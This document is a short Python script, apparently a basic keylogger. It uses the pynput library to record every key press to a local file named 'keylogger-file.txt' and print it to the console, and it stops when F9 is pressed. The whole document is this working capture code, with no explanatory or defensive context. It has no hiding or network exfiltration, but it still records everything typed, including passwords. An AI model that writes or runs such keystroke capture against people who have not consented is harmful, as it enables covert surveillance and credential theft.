from pynput.keyboard import Key, Listener

def on_press(key):
    print(key)
    with open("keylogger-file.txt", "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    if key == Key.f9:  
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
